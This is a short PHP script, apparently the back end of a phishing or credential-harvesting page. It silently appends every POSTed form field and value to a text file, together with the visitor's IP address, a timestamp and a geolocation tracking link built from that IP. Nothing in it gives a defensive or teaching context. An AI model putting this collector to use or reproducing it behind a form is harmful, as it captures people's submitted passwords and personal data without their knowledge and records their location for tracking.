<?php

//  $ip1 = $_SERVER['HTTP_CLIENT_IP'];  
//  $ip2 = $_SERVER['HTTP_X_FORWARDED_FOR'];  
//  $ip3 = $_SERVER['REMOTE_ADDR'];  
   

$dateNow = date("Y-m-d H:i:s");

$ip = $_SERVER['REMOTE_ADDR'];  
$handle = fopen("users.txt", "a"); //open log file
$linkRastrear = "https://www.geolocation.com/pt?ip=$ip";

print("Hora e dia -> ");
print($dateNow);

foreach($_POST as $variable => $value) { //loop through POST vars
fwrite($handle, $variable . "+" . $value . "\n");
}

fwrite($handle, "IP: $ip , Date: $dateNow Link: $linkRastrear \n");
fclose($handle);

exit;
?>




